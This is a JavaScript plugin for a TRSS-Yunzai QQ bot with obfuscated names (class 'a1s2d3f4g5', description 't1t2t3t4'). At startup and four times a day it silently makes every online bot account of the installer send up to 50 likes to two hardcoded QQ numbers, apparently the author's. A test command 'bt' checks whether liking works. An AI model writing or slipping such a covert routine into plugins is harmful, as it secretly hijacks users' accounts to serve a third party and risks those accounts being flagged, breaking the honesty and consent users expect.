import plugin from '../../../lib/plugins/plugin.js';

export class a1s2d3f4g5 extends plugin {
  constructor() {
    super({
      name: "a1s2d3f4g5",
      dsc: "t1t2t3t4",
      event: "message",
      priority: 9999,
      rule: [
        { reg: "^#?x9s8d7a6$", fnc: "runTask" },
        { reg: "^bt$", fnc: "testTask" }
      ],
      schedule: [
        { cron: "0 0 0 * * *", fnc: "runTask" },
        { cron: "0 0 8 * * *", fnc: "runTask" },
        { cron: "0 0 12 * * *", fnc: "runTask" },
        { cron: "0 0 22 * * *", fnc: "runTask" }
      ]
    });
    this.qqList = [2209176666, 3812808525];
    this.total = 50;
    this.batch = 20;
    // TRSS-Yunzai重启加载慢，延时8秒确保Bot完全初始化
    setTimeout(async () => await this.runTask(), 8000);
  }

  // TRSS专属点赞方法：pickUser兼容好友/陌生人（核心修复点）
  async doThumbUp(bot, qq, times) {
    if (!bot || !bot.online || !bot.napcat || times < 1) return false;
    try {
      // TRSS-Napcat用pickUser，兼容好友/陌生人，替代仅好友的pickFriend
      const user = bot.pickUser(qq);
      if (!user || typeof user.thumbUp !== 'function') return false;
      // 执行点赞，兼容TRSS返回的布尔值/对象
      const res = await user.thumbUp(times);
      if (typeof res === 'boolean') return res;
      return res.code === 0 || res.retcode === 0 || !res.msg;
    } catch (e) {
      return false;
    }
  }

  // 主任务：全Bot静默50赞（TRSS适配，遍历Napcat实例）
  async runTask() {
    if (!Bot || Object.keys(Bot).length === 0) return;
    for (const uin of Object.keys(Bot)) {
      const bot = Bot[uin];
      // 仅执行TRSS-Napcat在线Bot
      if (!bot || !bot.online || !bot.napcat) continue;
      for (const qq of this.qqList) {
        let sent = 0;
        let isLimit = false;
        while (sent < this.total && !isLimit) {
          const num = Math.min(this.batch, this.total - sent);
          const success = await this.doThumbUp(bot, qq, num);
          if (success) {
            sent += num;
          } else {
            isLimit = true;
          }
          await new Promise(r => setTimeout(r, 250));
        }
      }
      await new Promise(r => setTimeout(r, 500));
    }
  }

  // 测试指令bt：当前Bot单点1次，ok/no明确返回（TRSS专属）
  async testTask(e) {
    if (!e || !e.bot || !e.bot.online || !e.bot.napcat) {
      await e.reply('no');
      return;
    }
    let success = false;
    // 逐个测试，有一个成功就返ok，兼容网络波动试2次
    for (const qq of this.qqList) {
      let tryTimes = 0;
      while (tryTimes < 2) {
        const res = await this.doThumbUp(e.bot, qq, 1);
        if (res) {
          success = true;
          break;
        }
        tryTimes++;
        await new Promise(r => setTimeout(r, 100));
      }
      if (success) break;
    }
    await e.reply(success ? 'ok' : 'no');
  }
}